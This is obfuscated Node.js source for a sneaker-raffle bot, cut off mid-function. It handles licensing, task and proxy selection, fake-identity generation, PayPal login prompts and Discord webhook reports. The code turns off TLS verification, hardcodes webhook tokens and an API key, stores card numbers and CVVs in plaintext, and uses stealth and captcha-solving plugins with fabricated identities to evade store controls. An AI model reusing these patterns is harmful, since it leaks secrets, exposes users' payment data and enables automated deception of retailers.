process['env']['NODE_TLS_REJECT_UNAUTHORIZED'] = '0';
const _0xf25b74 = require('fs'), _0x473f62 = new Date()['toDateString']() + '\x20' + new Date()['getHours']() + '\x20' + new Date()['getMinutes']() + '\x20' + new Date()['getSeconds']();
function _0x4fdd28(_0x253dfa) {
    const _0x347c6e = _0xf25b74['createWriteStream'](_0x253dfa, { 'flags': 'a' }), _0x358353 = console['log'];
    console['log'] = function () {
        const _0x20e098 = Array['prototype']['slice']['call'](arguments), _0x58f296 = _0x20e098['join']('\x20') + '\x0a';
        _0x347c6e['write'](_0x58f296), _0x358353['apply'](console, _0x20e098);
    };
}
_0x4fdd28('../logs/log\x20' + _0x473f62);
var _0x1d3be0 = require('tough-cookie'), _0x54e3bb = require('node-imap'), _0x1d2079 = require('util')['inspect'];
const _0x2fc4a3 = require('mailparser')['simpleParser'], { EmbedBuilder: _0x38a790 } = require('discord.js');
var _0x278666 = require('exe');
const { execFile: _0x4a590e } = require('child_process'), _0x4ada75 = require('puppeteer-extra'), _0x2d400b = require('puppeteer-extra-plugin-recaptcha'), _0x120ab9 = require('puppeteer-extra-plugin-stealth'), _0x46bace = require('chalk'), _0x1e0e73 = require('node-bash-title'), _0x582cfc = require('axios'), _0x20e9d9 = require('papaparse');
var _0x392997 = require('random-name');
const _0x2b1433 = require('request');
var _0x4a038c = require('prompt');
const _0x3bb051 = _0x2b1433['jar']();
var _0x35ea91 = {};
const _0x5d1ea9 = '1067398661929181186/wvxr1d4nwFDFE-hAKBisU_mVWLloqatitfWvCqqIv38EUYiJMm_Pr3VKsuLsUBKN3PPj', _0x43630a = '1067398862056210432/TZs7kSEcDtUD13Vzl7VQhculxdtocZI8HKU7l_fW_W0qthftmSpHxNDY9NB3Hc4v6Yhy', _0x34a2d8 = '1068515411877957743/t_TXlLhYbeQmPL19hyGeNqi1G0KPT8KCBYOVOcryGMvXPfIUBEpNZRBCC1j7OFRej4A6', _0x3c5995 = '1068519704525807616/luGgvM1ZbR7g1zM5-10y5yceL2OGVCjrlkB6XxQL-hdoHUJ6hwSVAn6vVNyieHWLqPHE', _0xd26c97 = '1070657276525940746/GSfXwIxjuRjwmP3sTDw73M4V2P5OJqMFgZyECtpBwFmtXGINvj1xFsVsZ2KwGBpJNHpn', _0x3a5ad4 = '1072865476457287711/EePVQu0bb06IdHG3FfG7M-JDaE-38prupCPoCqaduP6mG_tsshUSaKidyfyVx0YgNC7e';
var _0x217105 = 'https://discord.com/api/webhooks/', _0x2c8cd2 = '' + _0x217105 + _0x34a2d8, _0x55ae18 = '' + _0x217105 + _0x3c5995, _0x53da78 = '' + _0x217105 + _0x5d1ea9, _0x556085 = '' + _0x217105 + _0x43630a, _0x44bee6 = '' + _0x217105 + _0xd26c97, _0xee8b1 = '' + _0x217105 + _0x3a5ad4;
const _0x23d37e = JSON['parse'](_0xf25b74['readFileSync']('../package.json', 'utf-8')), _0x4d5366 = _0x23d37e['version'];
var _0x18b452, _0x324cb1, _0x33a7bf, _0x5055a9, _0x8049b1, _0x5a1bfa, _0x5e8391, _0x16f657;
const _0x5e7a67 = 'pk_7R7rRwMpveiR8OufEx9xIDMdU8Y95GgvGLF59wWRqklMwhXdpDnh5sN2KfaPHjEe';
let _0x32c040 = ![];
const _0x4c2f2d = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', _0x27aeff = '0123456789';
var _0x3765c7 = _0x4c2f2d['split']('');
const _0x134778 = require('auto-git-update'), _0x50e592 = {
    'repository': 'https://github.com/Jarno97/JRafflesBot',
    'branch': 'main',
    'fromReleases': ![],
    'tempLocation': 'C:/temp/jraffles',
    'ignoreFiles': [
        'settings.json',
        'proxies.txt',
        'tasks/maha.csv',
        'tasks/footshop.csv',
        'tasks/afew.csv',
        'tasks/oqium.csv',
        'tasks/patta.csv',
        'accounts/patta.csv',
        'tasks/kickz.csv',
        'accounts/kickz-verified.csv',
        'accounts/kickz-unverified.csv'
    ]
}, _0x4d6da7 = new _0x134778(_0x50e592);
async function _0x3e8c88() {
    _0x8049b1 = _0xf25b74['readdirSync']('../proxies'), _0x5055a9 = _0xf25b74['readdirSync']('../tasks'), !_0xf25b74['existsSync']('../accounts/fenom.csv') && _0xf25b74['writeFileSync']('../accounts/fenom.csv', 'Email,Password\x0a'), !_0xf25b74['existsSync']('../accounts/paypal.csv') && _0xf25b74['writeFileSync']('../accounts/paypal.csv', 'Email,Password,Proxy\x0a'), !_0xf25b74['existsSync']('../accounts/bstn.csv') && _0xf25b74['writeFileSync']('../accounts/bstn.csv', 'Email,Password\x0a'), !_0xf25b74['existsSync']('../accounts/eql.csv') && _0xf25b74['writeFileSync']('../accounts/eql.csv', 'Email,Password,Phone\x0a'), !_0xf25b74['existsSync']('../failed-tasks.csv') && _0xf25b74['writeFileSync']('../failed-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), !_0xf25b74['existsSync']('../successful-tasks.csv') && _0xf25b74['writeFileSync']('../successful-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), _0x35ea91 = JSON['parse'](_0xf25b74['readFileSync']('../settings.json', 'utf-8')), !_0x35ea91['delay'] && (_0x35ea91['delay'] = 0x3c, _0xf25b74['writeFileSync']('../settings.json', JSON['stringify'](_0x35ea91, null, 0x2))), !_0x35ea91['masterMail'] && (_0x35ea91['masterMail'] = 'yourmail@gmail.com', _0xf25b74['writeFileSync']('../settings.json', JSON['stringify'](_0x35ea91, null, 0x2))), !_0x35ea91['masterPassword'] && (_0x35ea91['masterPassword'] = 'read\x20the\x20guide\x20on\x20how\x20to\x20get\x20an\x20APP\x20PASSWORD', _0xf25b74['writeFileSync']('../settings.json', JSON['stringify'](_0x35ea91, null, 0x2))), !_0x35ea91['captchaKey'] && (_0x35ea91['captchaKey'] = '', _0xf25b74['writeFileSync']('../settings.json', JSON['stringify'](_0x35ea91, null, 0x2))), !_0x35ea91['useRandomProxy'] && (_0x35ea91['useRandomProxy'] = !![], _0xf25b74['writeFileSync']('../settings.json', JSON['stringify'](_0x35ea91, null, 0x2))), !_0x35ea91['shuffleTasks'] && (_0x35ea91['shuffleTasks'] = ![], _0xf25b74['writeFileSync']('../settings.json', JSON['stringify'](_0x35ea91, null, 0x2))), !_0x35ea91['webhook'] && (_0x35ea91['webhook'] = '', _0xf25b74['writeFileSync']('../settings.json', JSON['stringify'](_0x35ea91, null, 0x2))), _0x35ea91['delay'] <= 0x1388 && (_0x35ea91['delay'] = _0x35ea91['delay'] * 0x3e8), _0x35ea91['AfewDelay'] && (delete _0x35ea91['AfewDelay'], _0xf25b74['writeFileSync']('../settings.json', JSON['stringify'](_0x35ea91, null, 0x2))), _0x35ea91['MahaDelay'] && (delete _0x35ea91['MahaDelay'], _0xf25b74['writeFileSync']('../settings.json', JSON['stringify'](_0x35ea91, null, 0x2))), _0x35ea91['footshopDelay'] && (delete _0x35ea91['footshopDelay'], _0xf25b74['writeFileSync']('../settings.json', JSON['stringify'](_0x35ea91, null, 0x2))), _0x35ea91['MahaDelay'] = _0x35ea91['delay'], _0x217105 = _0x35ea91['webhook'], _0x5a1bfa = _0x35ea91['licenseKey'];
}
let _0x465f43, _0x4db5e9 = [], _0x5dd639;
const _0x4d70b1 = _0x3e2259 => new Promise(_0x3d2c75 => setTimeout(_0x3d2c75, _0x3e2259));
function _0x54fb61(_0xa5ad81, _0x5d55d9) {
    return Math['floor'](Math['random']() * (_0x5d55d9 - _0xa5ad81 + 0x1) + _0xa5ad81);
}
function _0x21f522(_0xa0d49f) {
    let _0x56b307 = _0xa0d49f['length'], _0x2410df;
    while (_0x56b307 != 0x0) {
        _0x2410df = Math['floor'](Math['random']() * _0x56b307), _0x56b307--, [_0xa0d49f[_0x56b307], _0xa0d49f[_0x2410df]] = [
            _0xa0d49f[_0x2410df],
            _0xa0d49f[_0x56b307]
        ];
    }
    return _0xa0d49f;
}
async function _0xb31e29(_0xedff02) {
    return _0x582cfc['get']('https://api.hyper.co/v4/licenses/' + _0xedff02, { 'headers': { 'Authorization': 'Bearer\x20' + _0x5e7a67 } })['then'](_0x34d674 => _0x34d674['data'])['catch'](() => null);
}
;
async function _0x516d9b(_0x59b02a) {
    console['clear']();
    if (_0x59b02a == 'AWGH-0N92-JE6S-HOHU') {
        console['log']('Please\x20paste\x20your\x20key\x20here:');
        var _0x40808c = await _0x4a038c['get']('License');
        if (_0x40808c['License'] == 'AWGH-0N92-JE6S-HOHU')
            return console['log']('Error\x20please\x20use\x20the\x20key\x20on\x20the\x20JRaffles\x20dashboard'), await _0x4d70b1(0xbb8), _0x516d9b(_0x59b02a);
        _0x59b02a = _0x40808c['License'], _0x35ea91['licenseKey'] = _0x59b02a, _0x5a1bfa = _0x59b02a, _0xf25b74['writeFileSync']('../settings.json', JSON['stringify'](_0x35ea91));
    }
    console['log']('Checking\x20license\x20' + _0x5a1bfa + '...'), await _0x4d70b1(0x320);
    const _0x56c0f6 = await _0xb31e29(_0x59b02a);
    _0x5e8391 = JSON['stringify'](_0x56c0f6['user']['discord']['username'])['substring'](0x1)['slice'](0x0, -0x1), _0x16f657 = JSON['stringify'](_0x56c0f6['user']['discord']['avatar'])['substring'](0x1)['slice'](0x0, -0x1);
    if (!_0x56c0f6)
        return console['log']('License\x20not\x20found');
    if (!_0x56c0f6['user'])
        return console['log']('License\x20not\x20bound');
    return _0x56c0f6['status'] === 'active' ? (console['log']('License\x20is\x20good\x20to\x20go!'), _0x32c040 = !![]) : (console['log']('Could\x20not\x20find\x20license..'), _0x32c040 = ![]);
}
async function _0x2469c2() {
    var _0x539838 = await _0x4a038c['get']('Module');
    return console['clear'](), _0x539838['Module'];
}
;
async function _0x292405() {
    var _0x390e22 = await _0x4a038c['get']('Setting');
    return console['clear'](), _0x390e22['Setting'];
}
async function _0x23f1a9(_0x5c0b2e) {
    var _0x4ee4c0 = [];
    for (file of _0x5055a9) {
        var _0x2efcb1 = _0xf25b74['readFileSync']('../tasks/' + file, 'utf-8');
        tsParse = _0x20e9d9['parse'](_0x2efcb1, { 'header': !![] })['data'], tsParse[0x0]['Store'] == _0x5c0b2e['store'] && _0x4ee4c0['push'](file);
    }
    !_0x4ee4c0['length'] == 0x0 && (_0x5055a9 = _0x4ee4c0);
    console['log']('Choose\x20A\x20File\x20to\x20Run\x20\x0a');
    for (var _0x444e15 = 0x0; _0x444e15 < _0x5055a9['length']; _0x444e15++) {
        console['log']('\x20(' + _0x444e15 + ')\x20' + _0x5055a9[_0x444e15]);
    }
    console['log']('');
    var _0x583de8 = await _0x4a038c['get']('Task');
    if (_0x583de8['Task'] > _0x5055a9['length'] - 0x1 || isNaN(_0x583de8['Task']) == !![])
        return console['log']('Invalid\x20selection'), await _0x4d70b1(0x3e8), _0x23f1a9();
    var _0x44ee81 = _0xf25b74['readFileSync']('../tasks/' + _0x5055a9[_0x583de8['Task']], 'utf-8');
    return _0x33a7bf = _0x20e9d9['parse'](_0x44ee81, { 'header': !![] })['data'], console['clear'](), console['log']('Running\x20' + _0x46bace['blue'](_0x5055a9[_0x583de8['Task']])), _0x18b452 = _0x5055a9[_0x583de8['Task']], _0x33a7bf;
}
async function _0x35dc56() {
    console['clear'](), console['log']('Choose\x20Proxies\x20to\x20Use\x20\x0a');
    for (var _0x549e66 = 0x0; _0x549e66 < _0x8049b1['length']; _0x549e66++) {
        console['log']('\x20(' + _0x549e66 + ')\x20' + _0x8049b1[_0x549e66]);
    }
    console['log']('');
    var _0x235914 = await _0x4a038c['get']('Proxies');
    if (_0x235914['Proxies'] > _0x8049b1['length'] - 0x1 || isNaN(_0x235914['Proxies']) == !![])
        return console['log']('Invalid\x20selection'), await _0x4d70b1(0x3e8), _0x35dc56();
    var _0x504962 = _0xf25b74['readFileSync']('../proxies/' + _0x8049b1[_0x235914['Proxies']], 'utf-8')['split']('\x0a');
    let _0x30199e = _0x504962['map']((_0x470512, _0xc43a84) => {
        sanatizeProxy = _0x470512['replace']('\x0d', '');
        if (_0x504962[_0xc43a84 + 0x1] != undefined)
            return '' + sanatizeProxy;
        return '' + sanatizeProxy;
    });
    return _0x324cb1 = _0x8049b1[_0x235914['Proxies']], console['clear'](), _0x30199e;
}
async function _0x51236b() {
    var _0x3211fd = await _0x4a038c['get']('Value');
    return console['clear'](), _0x3211fd['Value'];
}
async function _0x25afa2(_0x36197d) {
    console['clear'](), console['log']('What\x20would\x20you\x20like\x20to\x20do?\x20\x0a');
    for (var _0xba53a7 = 0x0; _0xba53a7 < _0x36197d['length']; _0xba53a7++) {
        console['log']('\x20(' + _0xba53a7 + ')\x20[' + _0x36197d[_0xba53a7]['name'] + ']');
    }
    ;
    console['log']('');
    var _0x2980cd = await _0x4a038c['get']('Module');
    return _0x2980cd['Module'];
}
async function _0x41a8de() {
    var _0x7f84b0 = await _0x4a038c['get']('Password');
    return console['clear'](), _0x7f84b0['Password'];
}
;
async function _0xff4bf5() {
    var _0xea76bb = await _0x4a038c['get']('Links');
    return _0xea76bb['Links'];
}
;
async function _0x3a117f() {
    console['log']('Choose\x20a\x20Raffle\x20to\x20enter:\x20\x0a');
    for (var _0x5af6f5 = 0x0; _0x5af6f5 < _0x4db5e9['length']; _0x5af6f5++) {
        console['log']('\x20(' + _0x5af6f5 + ')\x20' + _0x4db5e9[_0x5af6f5]);
    }
    ;
    console['log']();
    let _0xfee69 = await _0x4a038c['get']('Product');
    return console['clear'](), _0xfee69['Product'];
}
;
function _0x446ef5() {
    var _0xb049ea = new Date(Date['now']())['toLocaleTimeString']();
    return _0xb049ea;
}
;
function _0x388490() {
    var _0x1fcb87 = new Date(Date['now']())['toLocaleString']();
    return _0x1fcb87['replace'](',', '');
}
async function _0x19fe15(_0x1022fb, _0x546810) {
    let _0x35f2d4 = { 'headers': { 'content-type': 'application/json' } };
    if (_0x4d5366 != 'devkey') {
        await _0x582cfc['post'](_0x1022fb, _0x546810, _0x35f2d4);
        return;
    }
    return console['log']('devkey\x20settings\x20enabled,\x20not\x20sending\x20webhooks');
}
;
async function _0x39e876(_0x2bb39d, _0x500c3e, _0x16bfae, _0x26ed53, _0x548e2a) {
    if (!_0x26ed53 && _0x16bfae == 'dev') {
        var _0x36df28 = new _0x38a790()['setColor'](0xc0d6d6)['setTitle']('Successful\x20Raffle\x20Entry')['setAuthor']({
            'name': 'JRaffles',
            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
            'url': 'https://twitter.com/JRaffles_'
        })['setThumbnail'](_0x500c3e['logo'])['addFields']({
            'name': 'Store',
            'value': '' + _0x500c3e['store'],
            'inline': !![]
        })['addFields']({
            'name': 'Size',
            'value': '' + _0x2bb39d['Size'],
            'inline': !![]
        })['addFields']({
            'name': 'Delay',
            'value': '' + _0x35ea91['delay'],
            'inline': !![]
        })['addFields']({
            'name': 'User',
            'value': '' + _0x5e8391,
            'inline': !![]
        })['addFields']({
            'name': 'URL',
            'value': '' + _0x2bb39d['Url'],
            'inline': !![]
        })['addFields']({
            'name': 'Mail',
            'value': '' + _0x2bb39d['Email'],
            'inline': !![]
        })['setTimestamp']()['setFooter']({
            'text': 'JRaffles\x20v' + _0x4d5366,
            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
        });
        return _0x36df28['data'];
    } else {
        if (_0x26ed53 && _0x16bfae == 'dev') {
            var _0x36df28 = new _0x38a790()['setColor'](0xc0d6d6)['setTitle']('Failed\x20Raffle\x20Entry')['setAuthor']({
                'name': 'JRaffles',
                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                'url': 'https://twitter.com/JRaffles_'
            })['setThumbnail'](_0x500c3e['logo'])['addFields']({
                'name': 'User',
                'value': '' + _0x5e8391,
                'inline': !![]
            }, {
                'name': 'Store',
                'value': '' + _0x500c3e['store'],
                'inline': !![]
            }, {
                'name': 'Size',
                'value': '' + _0x2bb39d['Size'],
                'inline': !![]
            }, {
                'name': 'Delay',
                'value': '' + _0x35ea91['delay'],
                'inline': !![]
            })['addFields']({
                'name': 'ERROR',
                'value': '' + _0x548e2a,
                'inline': !![]
            })['addFields']({
                'name': 'URL',
                'value': '' + _0x2bb39d['Url']
            })['addFields']({
                'name': 'Mail',
                'value': '' + _0x2bb39d['Email'],
                'inline': !![]
            })['setTimestamp']()['setFooter']({
                'text': 'JRaffles\x20v' + _0x4d5366,
                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
            });
            return _0x36df28['data'];
        } else {
            if (_0x16bfae == 'pub') {
                var _0x36df28 = new _0x38a790()['setColor'](0xc0d6d6)['setTitle']('Succesful\x20Raffle\x20Entry')['setAuthor']({
                    'name': 'JRaffles',
                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                    'url': 'https://twitter.com/JRaffles_'
                })['setThumbnail'](_0x500c3e['logo'])['addFields']({
                    'name': 'Store',
                    'value': '' + _0x500c3e['store'],
                    'inline': !![]
                }, {
                    'name': 'Size',
                    'value': '' + _0x2bb39d['Size'],
                    'inline': !![]
                }, {
                    'name': 'Delay',
                    'value': '' + _0x35ea91['delay'],
                    'inline': !![]
                })['addFields']({
                    'name': 'URL',
                    'value': '||' + _0x2bb39d['Url'] + '||'
                })['setTimestamp']()['setFooter']({
                    'text': 'JRaffles\x20v' + _0x4d5366,
                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                });
                return _0x36df28['data'];
            } else {
                if (_0x16bfae == 'acc' && !_0x26ed53) {
                    var _0x36df28 = new _0x38a790()['setColor'](0xc0d6d6)['setTitle']('Account\x20Generated')['setAuthor']({
                        'name': 'JRaffles',
                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                        'url': 'https://twitter.com/JRaffles_'
                    })['setThumbnail'](_0x500c3e['logo'])['addFields']({
                        'name': 'User',
                        'value': '' + _0x5e8391,
                        'inline': !![]
                    }, {
                        'name': 'Store',
                        'value': '' + _0x500c3e['store'],
                        'inline': !![]
                    }, {
                        'name': 'Delay',
                        'value': '' + _0x35ea91['delay'],
                        'inline': !![]
                    })['setTimestamp']()['setFooter']({
                        'text': 'JRaffles\x20v' + _0x4d5366,
                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                    });
                    return _0x36df28['data'];
                } else {
                    if (_0x16bfae == 'acc' && _0x26ed53) {
                        var _0x36df28 = new _0x38a790()['setColor'](0xc0d6d6)['setTitle']('Account\x20Generation\x20Failed')['setAuthor']({
                            'name': 'JRaffles',
                            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                            'url': 'https://twitter.com/JRaffles_'
                        })['setThumbnail'](_0x500c3e['logo'])['addFields']({
                            'name': 'User',
                            'value': '' + _0x5e8391,
                            'inline': !![]
                        }, {
                            'name': 'Error',
                            'value': '' + _0x548e2a,
                            'inline': !![]
                        }, {
                            'name': 'Store',
                            'value': '' + _0x500c3e['store'],
                            'inline': !![]
                        }, {
                            'name': 'Delay',
                            'value': '' + _0x35ea91['delay'],
                            'inline': !![]
                        })['setTimestamp']()['setFooter']({
                            'text': 'JRaffles\x20v' + _0x4d5366,
                            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                        });
                        return _0x36df28['data'];
                    } else {
                        if (_0x16bfae == 'open') {
                            var _0x36df28 = new _0x38a790()['setColor'](0xc0d6d6)['setTitle']('User\x20Opened\x20JRaffles')['setAuthor']({
                                'name': 'JRaffles',
                                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                'url': 'https://twitter.com/JRaffles_'
                            })['setThumbnail'](_0x16f657)['addFields']({
                                'name': 'User',
                                'value': '' + _0x5e8391,
                                'inline': !![]
                            })['setTimestamp']()['setFooter']({
                                'text': 'JRaffles\x20v' + _0x4d5366,
                                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                            });
                            return _0x36df28['data'];
                        } else {
                            if (!_0x26ed53 && _0x16bfae == 'ver') {
                                var _0x36df28 = new _0x38a790()['setColor'](0xc0d6d6)['setTitle']('Successful\x20Verification')['setAuthor']({
                                    'name': 'JRaffles',
                                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                    'url': 'https://twitter.com/JRaffles_'
                                })['setThumbnail'](_0x500c3e['logo'])['addFields']({
                                    'name': 'User',
                                    'value': '' + _0x5e8391,
                                    'inline': !![]
                                }, {
                                    'name': 'Store',
                                    'value': '' + _0x500c3e['store'],
                                    'inline': !![]
                                }, {
                                    'name': 'Delay',
                                    'value': '' + _0x35ea91['delay'],
                                    'inline': !![]
                                })['setTimestamp']()['setFooter']({
                                    'text': 'JRaffles\x20v' + _0x4d5366,
                                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                                });
                                return _0x36df28['data'];
                            } else {
                                if (_0x26ed53 && _0x16bfae == 'ver') {
                                    var _0x36df28 = new _0x38a790()['setColor'](0xc0d6d6)['setTitle']('Verification\x20Failed')['setAuthor']({
                                        'name': 'JRaffles',
                                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                        'url': 'https://twitter.com/JRaffles_'
                                    })['setThumbnail'](_0x500c3e['logo'])['addFields']({
                                        'name': 'User',
                                        'value': '' + _0x5e8391,
                                        'inline': !![]
                                    }, {
                                        'name': 'Error',
                                        'value': '' + _0x548e2a,
                                        'inline': !![]
                                    }, {
                                        'name': 'Store',
                                        'value': '' + _0x500c3e['store'],
                                        'inline': !![]
                                    }, {
                                        'name': 'Delay',
                                        'value': '' + _0x35ea91['delay'],
                                        'inline': !![]
                                    })['setTimestamp']()['setFooter']({
                                        'text': 'JRaffles\x20v' + _0x4d5366,
                                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                                    });
                                    return _0x36df28['data'];
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}
async function _0x408b94(_0x4d9274, _0xfdabc9) {
    var _0x43a2fc = _0x4d9274[_0xfdabc9]['Address1']['split'](''), _0x71731b = _0x4d9274[_0xfdabc9]['Address2']['split'](''), _0x211a96 = _0x4d9274[_0xfdabc9]['Email']['split']('@');
    for (var _0x1aa5d5 = 0x0; _0x1aa5d5 < _0x43a2fc['length']; _0x1aa5d5++) {
        if (_0x43a2fc[_0x1aa5d5] == 'X') {
            var _0x2811b3 = Math['round'](Math['random']() * (_0x4c2f2d['length'] - 0x1));
            _0x43a2fc[_0x1aa5d5] = _0x3765c7[_0x2811b3];
        }
    }
    ;
    for (var _0x1aa5d5 = 0x0; _0x1aa5d5 < _0x71731b['length']; _0x1aa5d5++) {
        if (_0x71731b[_0x1aa5d5] == 'X') {
            var _0x2811b3 = Math['round'](Math['random']() * (_0x4c2f2d['length'] - 0x1));
            _0x71731b[_0x1aa5d5] = _0x3765c7[_0x2811b3];
        }
    }
    ;
    _0x4d9274[_0xfdabc9]['FirstName']['toUpperCase']() == 'RANDOM' && (_0x4d9274[_0xfdabc9]['FirstName'] = _0x392997['first']());
    _0x4d9274[_0xfdabc9]['LastName']['toUpperCase']() == 'RANDOM' && (_0x4d9274[_0xfdabc9]['LastName'] = _0x392997['last']());
    _0x211a96[0x0]['toUpperCase']() == 'RANDOM' ? _0x211a96[0x0] = '' + _0x392997['first']() + _0x392997['last']() + _0x54fb61(0x1, 0x270f) + '@' : _0x211a96[0x0] = _0x211a96[0x0] + '@';
    _0x4d9274[_0xfdabc9]['Email'] = _0x211a96['join'](''), _0x4d9274[_0xfdabc9]['Address1'] = _0x43a2fc['join'](''), _0x4d9274[_0xfdabc9]['Address2'] = _0x71731b['join']('');
    _0x4d9274[_0xfdabc9]['Phone'] == 'RANDOM' && (_0x4d9274[_0xfdabc9]['Phone'] = '0' + _0x54fb61(0x5f5e100, 0x3b9ac9ff));
    if (_0x4d9274[_0xfdabc9]['Follower']['toUpperCase']() == 'RANDOM') {
        var _0x59b64b = _0x54fb61(0x1, 0x270f);
        _0x4d9274[_0xfdabc9]['Follower'] = '' + _0x392997['first']() + _0x392997['last']() + _0x59b64b + '\x20';
    }
    _0x4d9274[_0xfdabc9]['HouseNumber']['toUpperCase']() == 'RANDOM' && (_0x4d9274[_0xfdabc9]['HouseNumber'] = _0x54fb61(0x1, 0xc8));
    if (_0x4d9274[_0xfdabc9]['Address1']['toUpperCase']() == 'RANDOM') {
        var _0x401ed3 = Math['round'](Math['random']() * (_0x4c2f2d['length'] - 0x1)), _0x59b0bc = _0x3765c7[_0x401ed3];
        _0x4d9274[_0xfdabc9]['Address1'] = _0x392997['last']() + 'straat', _0x4d9274[_0xfdabc9]['Zip'] == '' && (_0x4d9274[_0xfdabc9]['Postcode'] = _0x54fb61(0x3e8, 0x270f) + '\x20' + _0x59b0bc + _0x59b0bc, _0x4d9274[_0xfdabc9]['Zip'] = _0x4d9274[_0xfdabc9]['Postcode']), _0x4d9274[_0xfdabc9]['HouseNumber'] = '' + _0x54fb61(0x1, 0xc8);
    }
    return;
}
;
async function _0x5415a4(_0x1504fb, _0x480542) {
    _0xf25b74['appendFileSync']('../failed-tasks.csv', _0x388490() + ',' + _0x480542['store'] + ',' + _0x480542['name'] + ',' + _0x1504fb['Url'] + ',' + _0x1504fb['Size'] + ',' + _0x1504fb['Follower'] + ',' + _0x1504fb['FirstName'] + ',' + _0x1504fb['LastName'] + ',' + _0x1504fb['Address1'] + ',' + _0x1504fb['Address2'] + ',' + _0x1504fb['HouseNumber'] + ',' + _0x1504fb['Zip'] + ',' + _0x1504fb['City'] + ',' + _0x1504fb['State'] + ',' + _0x1504fb['Country'] + ',' + _0x1504fb['Phone'] + ',' + _0x1504fb['Email'] + ',' + _0x1504fb['Password'] + ',' + _0x1504fb['PaymentMethod'] + ',' + _0x1504fb['CardType'] + ',' + _0x1504fb['NameOnCard'] + ',' + _0x1504fb['CardNumber'] + ',' + _0x1504fb['ExpiryDate'] + ',' + _0x1504fb['CVV'] + ',' + _0x1504fb['IsBillingSame'] + ',,,,,,,,,,\x0a');
}
async function _0x5155d2(_0x4b3163, _0x4fffef) {
    _0xf25b74['appendFileSync']('../successful-tasks.csv', _0x388490() + ',' + _0x4fffef['store'] + ',' + _0x4fffef['name'] + ',' + _0x4b3163['Url'] + ',' + _0x4b3163['Size'] + ',' + _0x4b3163['Follower'] + ',' + _0x4b3163['FirstName'] + ',' + _0x4b3163['LastName'] + ',' + _0x4b3163['Address1'] + ',' + _0x4b3163['Address2'] + ',' + _0x4b3163['HouseNumber'] + ',' + _0x4b3163['Zip'] + ',' + _0x4b3163['City'] + ',' + _0x4b3163['State'] + ',' + _0x4b3163['Country'] + ',' + _0x4b3163['Phone'] + ',' + _0x4b3163['Email'] + ',' + _0x4b3163['Password'] + ',' + _0x4b3163['PaymentMethod'] + ',' + _0x4b3163['CardType'] + ',' + _0x4b3163['NameOnCard'] + ',' + _0x4b3163['CardNumber'] + ',' + _0x4b3163['ExpiryDate'] + ',' + _0x4b3163['CVV'] + ',' + _0x4b3163['IsBillingSame'] + ',,,,,,,,,,\x0a');
}
function _0x49f843() {
    let _0xf38dc8 = proxyFile['split']('\x0a'), _0x2f043b = _0xf38dc8['map']((_0xd05aa, _0xa1b574) => {
        sanatizeProxy = _0xd05aa['replace']('\x0d', '');
        if (_0xf38dc8[_0xa1b574 + 0x1] != undefined)
            return '' + sanatizeProxy;
        return '' + sanatizeProxy;
    });
    return _0x2f043b;
}
;
async function _0x598e5f(_0x559a2b, _0x3ba9fd) {
    if (_0x533b5d != 'yes')
        var _0x533b5d = '', _0x33f62b = 0x0;
    async function _0x434911() {
        var _0x836d1b = _0xf25b74['readFileSync']('../accounts/paypal.csv', 'utf-8');
        let _0x4fa912 = _0x20e9d9['parse'](_0x836d1b, { 'header': !![] })['data'];
        console['log']('Choose\x20a\x20Paypal\x20to\x20use:\x0a');
        for (var _0x956d73 = 0x0; _0x956d73 < _0x4fa912['length']; _0x956d73++) {
            console['log']('(' + _0x956d73 + ')\x20' + _0x4fa912[_0x956d73]['Email']);
        }
        console['log']('\x0a(' + _0x4fa912['length'] + ')\x20' + _0x46bace['cyan']('Add\x20a\x20new\x20account'));
        let _0x23a535 = await _0x4a038c['get']('Option');
        if (_0x23a535['Option'] < _0x4fa912['length'])
            return _0x4fa912[_0x23a535['Option']];
        console['clear'](), console['log']('Adding\x20a\x20new\x20account\x0aEnter\x20your\x20paypal\x27s\x20email:\x0a');
        let _0xc914e8 = {}, _0x101cc3 = await _0x4a038c['get']('Email');
        _0xc914e8['Email'] = _0x101cc3['Email'];
        var _0x4eae96 = Math['round'](Math['random']() * (_0x3ba9fd['length'] - 0x1));
        _0xc914e8['Proxy'] = _0x3ba9fd[_0x4eae96], console['clear'](), console['log']('Enter\x20your\x20paypal\x27s\x20password:\x0a');
